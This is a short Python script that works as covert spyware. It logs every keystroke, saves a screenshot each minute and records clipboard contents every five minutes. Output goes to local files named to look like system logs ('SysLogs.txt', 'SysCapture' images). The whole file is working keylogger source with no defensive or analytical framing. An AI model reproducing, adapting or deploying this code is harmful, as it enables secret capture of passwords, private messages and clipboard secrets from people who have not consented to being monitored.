from pynput.keyboard import Key, Listener #Key logging
from PIL import ImageGrab #Screenshot capturing
from pyperclip import paste #Clipboard monitoring
from time import sleep, strftime
from threading import Thread #Running all 3 tasks simultaneously 
import os

logFile = "SysLogs.txt"
if not os.path.exists("Images"):
    os.makedirs("Images")

def onPress(key):
    try:
        with open(logFile, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        with open(logFile, "a") as file:
            file.write(f"[{key}]")

def onRelease(key):
    if key == Key.esc:
        return False

#Every minute a screenshot is taken and stored in an Images directory with the timestamp of when the screenshot was taken
def captureScreenshot():
    while True:
        screenshot = ImageGrab.grab()
        timestamp = strftime("%Y%m%d-%H%M%S")
        screenshot.save(os.path.join("Images", f"SysCapture{timestamp}.png"))
        sleep(60)

#Every 5mins the contents of the clipboard are copied and stored in the SysLogs.txt file with a unique [Clipboard] tag to differentiate it
def monitorClipboard():
    previousClipboard = ""
    while True:
        clipboardText = paste()
        if clipboardText != previousClipboard:
            with open(logFile, "a") as file:
                file.write(f"[Clipboard]: {clipboardText}\n")
            previousClipboard = clipboardText
        sleep(300)

#All keystrokes are recorded into a file called SysLogs.txt
def startListener():
    with Listener(on_press=onPress, on_release=onRelease) as listener:
        listener.join()

if __name__ == "__main__":
    Thread(target=startListener).start()
    Thread(target=captureScreenshot).start()
    Thread(target=monitorClipboard).start()
